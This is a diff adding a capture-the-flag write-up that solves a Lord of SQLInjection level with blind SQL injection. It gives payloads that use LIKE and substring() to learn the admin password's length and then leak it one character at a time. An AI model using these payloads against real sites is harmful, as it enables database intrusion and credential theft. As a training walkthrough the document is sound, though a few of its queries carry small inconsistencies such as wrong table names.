@@ -5,7 +5,171 @@ pagination_prev: null
 sidebar_position: 11
 ---
 
-## Script
+![1](https://github.com/Kunull/Write-ups/assets/110326359/70c7ce92-21ac-447b-af42-ded1eaaf1b64)
+
+We are provided with the SQL query:
+
+```sql
+SELECT id FROM prob_golem WHERE id='guest' AND pw='{$_GET[pw]}'
+```
+
+The code also performs two conditional checks:
+
+1. `if($result['id'])`: It checks if the statement is `True`. If yes, it prints the following message: `Hello admin`
+2. `if(($result['pw']) && ($result['pw'] == $_GET['pw']))`: It then checks if the `pw` that is provided is correct. If yes, it prints the flag.
+
+It is similar to [orge](https://writeups-kunull.vercel.app/Lord%20of%20SQLInjection/orge) but this level also blocks the `=` and `substr` characters. So we will have to use their alternatives `LIKE` and `substring` respectively.
+
+In order to print out the flag, we need to first know the password. We have to perform a Blind SQL Injection.
+
+## Blind SQL Injection
+
+First we have to reveal the length of the flag.
+
+### Retrieving the password length
+
+If we provide the following URI:
+
+```
+?pw=' || id LIKE 'admin' %26%26 length(pw) LIKE 1 -- -
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 1 -- -'
+
+## Queried part:
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 1
+
+## Commented part:
+'
+```
+
+![2](https://github.com/Kunull/Write-ups/assets/110326359/34e0d15d-bb1c-43c8-a2a2-03ec0cbec69b)
+
+Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
+That tells us that the length of the `pw` column is more than 1.
+
+If we keep increasing the length and provide the following URI:
+
+```
+?pw=' || id LIKE 'admin' %26%26 length(pw) LIKE 8 -- -
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 8 -- -'
+
+## Queried part:
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 8
+
+## Commented part:
+'
+```
+
+![3](https://github.com/Kunull/Write-ups/assets/110326359/eacec623-361b-4530-b07b-b10699861646)
+
+Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
+That tells us that the length of the `pw` column is 8.
+
+
+### Leaking the password
+
+Next, we can leak the password byte by byte using the `substr()` function.
+
+#### `substr()`
+
+![Pasted image 20240610125927](https://github.com/Kunull/Write-ups/assets/110326359/063e53c5-9020-42b4-b78a-40133f95d84d)
+
+If we provide the following URI:
+
+```
+?pw=' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '0' -- -
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '0' -- -'
+
+## Queried part:
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '0'
+
+## Commented part:
+'
+```
+
+![4](https://github.com/Kunull/Write-ups/assets/110326359/c13d9b1f-2d75-43fc-9d07-9845caf35c90)
+
+Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
+
+That tells us that the first character of the `pw` for `id=admin` is not `0`.
+
+We can try other characters moving up to the following:
+
+```
+?pw=' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '7' -- -
+```
+
+The resultant query then becomes:
+
+```sql
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '7' -- -'
+
+## Queried part:
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '7'
+
+## Commented part:
+'
+```
+
+![5](https://github.com/Kunull/Write-ups/assets/110326359/d89bfdba-6af8-44c9-9881-968141be2efa)
+
+We can move onto the next characters:
+
+```
+?pw=' || id LIKE 'admin' %26%26 substring(pw, 2, 1) LIKE '0' -- -
+```
+
+The resultant query then becomes:
+
+```sql
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 2, 1) LIKE '0' -- -'
+
+## Queried part:
+SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 2, 1) LIKE '0'
+
+## Commented part:
+'
+```
+
+![6](https://github.com/Kunull/Write-ups/assets/110326359/f0b3cf8f-0dde-461d-a853-a9a0ebbd8b47)
+
+Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
+
+That tells us that the second character of the `pw` for `id=admin` is not `0`.
+
+We can keep repeating this process until we get all the eight characters of the `admin` password:
+
+```
+77d6290b
+```
+
+Now, we can provide password URI:
+
+```
+?pw=77d6290b
+```
+
+The resultant query becomes:
+
+```sql
+SELECT id FROM prob_orc WHERE id='admin' AND pw='77d6290b'
+```
+
+### Script
 
 ```py title="golem_script.md"
 import requests
@@ -98,3 +262,5 @@ $ python .\golem_script.py.py
 [!] Extracted password: 77d6290b
 [!] Final payload: ?pw=77d6290b
 ```
+
+![7](https://github.com/Kunull/Write-ups/assets/110326359/32bafc83-a76d-4d3d-98b0-8f47a4f83333)
